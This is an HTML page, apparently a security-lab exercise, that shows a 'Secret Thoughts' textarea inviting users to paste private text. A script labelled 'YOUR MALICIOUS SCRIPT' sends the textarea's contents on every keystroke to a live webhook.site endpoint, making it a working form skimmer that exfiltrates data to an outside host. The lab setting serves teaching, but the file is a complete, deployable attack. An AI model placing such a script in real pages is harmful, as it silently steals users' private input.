<html>
  <head>
    <title>Static Web App Lab 4</title>
  </head>
  <body
    style="display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f0f0f0;"
  >
    <div
      style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
    >
      <h1>Static Web App Lab 4 - Write</h1>
      <div style="margin: 20px;">
        <h2>Secret Thoughts</h2>
        <textarea
          id="secretThoughts"
          rows="10"
          cols="50"
          placeholder="Paste your secret thoughts here..."
          style="width: 100%; max-width: 500px;"
        ></textarea>
      </div>
    </div>
    
    <!-- YOUR MALICIOUS SCRIPT -->
    <script>
    document.addEventListener("DOMContentLoaded", function() {
      var textarea = document.getElementById("secretThoughts");
      if (textarea) {
        textarea.addEventListener("input", function() {
          fetch("https://webhook.site/728b7cd3-386f-4434-bbb7-cf5aa607afa6", {
            method: "POST",
            headers: { "Content-Type": "text/plain" },
            body: textarea.value
          });
        });
      }
    });
    </script>
  </body>
</html>
